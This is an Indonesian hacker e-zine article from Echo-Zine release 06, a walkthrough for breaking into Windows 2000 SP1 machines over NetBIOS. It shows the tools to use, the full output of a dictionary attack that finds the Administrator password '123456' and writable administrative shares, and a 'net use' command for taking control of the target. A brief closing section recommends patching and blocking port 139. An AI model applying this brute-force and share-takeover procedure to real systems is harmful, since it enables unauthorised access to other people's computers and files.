@@ -1,0 +1,209 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+
+
+ECHO-ZINE RELEASE
+       06
+
+Author: inue_99 Csrg|| (http://csrg.cjb.net/~csrg/ ) inue_99@yahoo.com
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== Hacking Net Bios Windows 2000 sp 1 ==
+
+
+Jaringan yang mendukung sistem input/output (NetBIOS) tidak lagi diperlukan 
+untuk berkomunikasi dengan pc lain yang menggunakan sistem oprasi Microsoft 
+windows. Meskipun demikian, sama dengan penggunaan protokol TCP/IP yang lain 
+net bios masih banyak digunakan.
+
+Hal ini sangatlah mengejutkan sebab semua jaringan microsoft sebelum windows 
+2000 memerlukan NETBIOS sebagai pendukung protokol lainnya. Kebanyakan protokol 
+ini berada pada bagian TCP/IP, IPX/SPX. Oleh karena itu administrator tidak 
+mempunyai pilihan lain untuk menggunakan berbagai protokol, sebab tanpa protokol 
+yang lain , produk microsoft tidak dapat berkomunikasi antara satu dan lainnya.
+
+NET BIOS adalah suatu program aplikasi penghubung. NET BIOS dibuat oleh IBM dan 
+SYTEK pada tahun 1984 untuk program jaringan pada pc mereka yang kemudian 
+diadaptasikan oleh microsoft dan meliputi ms-dos versi 3.1. Sejak saat itu NET 
+BIOS telah menjadi suatu worlwide yang standar. 
+
+Netbios standard memungkinkan komunikasi aplikasi komputer yang berbeda untuk 
+berkomunikasi ke berbagai protokol LOCAL AREA NETWORK (LAN), mencakup Internet 
+Protokol (Ip). Bagaimanapun net bios tidaklah dengan sendirinya suatu menaklukkan 
+mekanisme untuk berkomunikasi ke seberang suatu WIDE AREA NETWORK (WAN) Karena 
+memerlukan bantuan dari mekanisme lain, seperti TCP.
+
+Net Bios merupakan alat penghubung program untuk berkomunikasi dengan jaringan, 
+kemudian bersandar pada tingkatan protokol yang lebih rendah seperti NetBEUI 
+untuk mengirimkan informasi antar mesin. NetBEUI berfungsi sebagai media 
+penghubung NetBIOS ke ke jaringan. 
+
+
+Metoda pengujian
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+  Sebelum memulai ada baik nya anda mempersiapkan utilitas dibawah ini :
+1. IP Scanner (Advance IP Scanner )
+2. Port Scanner (NMAP)
+3. Win Nt Password Cracker ( NetBIOS Auditing Tool )
+4. Database Password yang lumayan banyak.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+1. Cari Komputer target dengan IpScanner
+2. Identifikasi port yang terbuka dengan menggunakan Nmap apakah port 139 terbuka
+3. Jika sudah diketemuakan kitda dapat mencoba password dari windows 2000 tersebut 
+dengan menggunakan nat (NetBIOS Auditing Tool) Dengan menggunakan perintah sbb pada 
+command prompt:
+
+
+
+Setelah perintah diatas dilakukan maka akan muncul sebagai berikut
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+[*]--- Reading usernames from user.txt
+[*]--- Reading passwords from pass.txt
+
+[*]--- Checking host: 10.1.3.100
+[*]--- Obtaining list of remote NetBIOS names
+[*]--- Remote systems name tables:
+
+     COMPUTER-CSRG
+     COMPUTER-CSRG
+     CSRG
+     CSRG
+     COMPUTER-CSRG
+     INet~Services
+     IS~COMPUTER-CSR
+
+[*]--- Attempting to connect with name: *
+[*]--- Unable to connect
+
+[*]--- Attempting to connect with name: COMPUTER-CSRG
+[*]--- CONNECTED with name: COMPUTER-CSRG
+[*]--- Attempting to connect with protocol: MICROSOFT NETWORKS 1.03
+[*]--- Server time is Fri Jun 11 11:14:22 2004
+[*]--- Timezone is UTC+7.0
+[*]--- Remote server wants us to encrypt, telling it not to
+
+[*]--- Attempting to connect with name: COMPUTER-CSRG
+[*]--- CONNECTED with name: COMPUTER-CSRG
+[*]--- Attempting to establish session
+[*]--- Was not able to establish session with no password
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ADMINISTRATOR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `GUEST'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ROOT'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ADMIN'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `PASSWORD'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `TEMP'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `SHARE'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `WRITE'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `FULL'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `BOTH'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `READ'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `FILES'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `DEMO'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `TEST'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ACCESS'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `USER'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `BACKUP'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `SYSTEM'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `SERVER'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `LOCAL'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `ADMINISTRATEUR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `INVITE'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `invité'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `SAUVEGARDE'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `OPERATEUR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `opérateur'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `UTILISATEUR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `DUPLICATEUR'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `76182'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `123'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `hanya'
+[*]--- Attempting to connect with Username: `ADMINISTRATOR' Password: `123456'
+[*]--- CONNECTED: Username: `ADMINISTRATOR' Password: `123456'
+
+[*]--- Obtained server information:
+
+Server=[COMPUTER-CSRG] User=[] Workgroup=[CSRG] Domain=[]
+
+[*]--- This machine has a browse list:
+
+Server Comment
+--------- -------
+COMPUTER-CSRG 
+CSRG-4WAR 
+WORKSHOP-SAMSOE 
+
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\
+[*]--- Unable to access
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\ADMIN$
+[*]--- WARNING: Able to access share: \\COMPUTER-CSRG\ADMIN$
+[*]--- Checking write access in: \\COMPUTER-CSRG\ADMIN$
+[*]--- WARNING: Directory is writeable: \\COMPUTER-CSRG\ADMIN$
+[*]--- Attempting to exercise .. bug on: \\COMPUTER-CSRG\ADMIN$
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\C$
+[*]--- WARNING: Able to access share: \\COMPUTER-CSRG\C$
+[*]--- Checking write access in: \\COMPUTER-CSRG\C$
+[*]--- WARNING: Directory is writeable: \\COMPUTER-CSRG\C$
+[*]--- Attempting to exercise .. bug on: \\COMPUTER-CSRG\C$
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\D$
+[*]--- WARNING: Able to access share: \\COMPUTER-CSRG\D$
+[*]--- Checking write access in: \\COMPUTER-CSRG\D$
+[*]--- WARNING: Directory is writeable: \\COMPUTER-CSRG\D$
+[*]--- Attempting to exercise .. bug on: \\COMPUTER-CSRG\D$
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\ROOT
+[*]--- Unable to access
+
+[*]--- Attempting to access share: \\COMPUTER-CSRG\WINNT$
+[*]--- Unable to access
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Pada baris
+[*]--- CONNECTED: Username: `ADMINISTRATOR' Password: `123456'
+menunjukan bahwa password sudah ditemukan dengan username ADMINISTRATOR dan 
+Password password.
+ 
+Setelah username dan password di temukan maka kita dapat melakukan koneksi ke 
+computer target denggan menggunakan perintah sbb 
+pada shel cmd 
+
+net use \\\\COMPUTER-CSRG\ipc$ /user:administrator 123456
+ 
+
+Jika yang muncul pesan ?The command completed successfully.? Berarti kita sudah
+berhasil menguasai computer tersebut. Setelah itu kita dapat mengakses file 
+yang terdapat pada komputer
+tersebut. 
+
+
+Solusi
+
+Solusi untuk mencegah komputer anda di hack dengan cara tadi dapat dilakukan dengan 
+beberapa cara antara lain dengan :
+1. Mengupgrade service pack 4 yang dapat di download dari http://windowsupdate.microsoft.com 
+2. Menggunakan Firewall untuk menutup port 139
+
+
+REFERENSI a.k.a bacaan :
+..... Windows NT Deconsctruction Tatics Step by Step NT Explotation 
+Techniquesby vacuum of Rhino9 & Technotronic. (vacuum@technotronic.com)
+
+
+*greetz to: 
+All Csrg STMIK"ABG" Crew thanks buat cacian, makian, support, yang membantu 
+selesainya tulisan ini.
+
+kirimkan kritik && saran ke inue_99@yahoo.com
